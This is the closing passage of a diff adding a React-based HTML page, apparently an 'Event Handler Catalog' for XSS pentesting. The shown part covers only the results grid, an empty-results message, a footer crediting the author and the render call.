+                            </div>
+                        </div>
+
+                        {/* Results Grid */}
+                        <section className="grid gap-6 sm:grid-cols-2 lg:grid-cols-3 max-w-7xl mx-auto py-8 px-4 main-content ">
+                            {filtered.length > 0 ? (
+                                filtered.map(h => <HandlerCard key={h.name} h={h} />)
+                            ) : (
+                                <div className="col-span-full rounded-xl bg-white p-12 text-center ring-1 ring-gray-200 shadow-sm">
+                                    <p className="text-2xl text-gray-700 font-semibold mb-2">No handlers matched. 😔</p>
+                                    <p className="text-gray-500 text-lg">Try adjusting your search query, filter type, or context selection.</p>
+                                </div>
+                            )}
+                        </section>
+
+                        {/* Footer */}
+                        <footer className="mt-20 pt-8 border-t border-gray-200 text-sm text-gray-500 text-center">
+                            <p className="mt-4 text-xs font-semibold text-gray-800 text-center text-gray-500 text-sm">
+                                Event Handler Catalog | {HANDLERS.length} Handlers |
+                                Developed for Ethical Hacking Pentesting| by <a href="https://sudohopex.github.io/"> SudoHopeX </a>
+                            </p>
+                        </footer>
+                    </div>
+                </div>
+            );
+        }
+
+        // --- Final Render Step ---
+        const container = document.getElementById('root');
+        const root = createRoot(container);
+        root.render(<XssDefenseCatalog />);
+
+    </script>
+</body>
+</html>
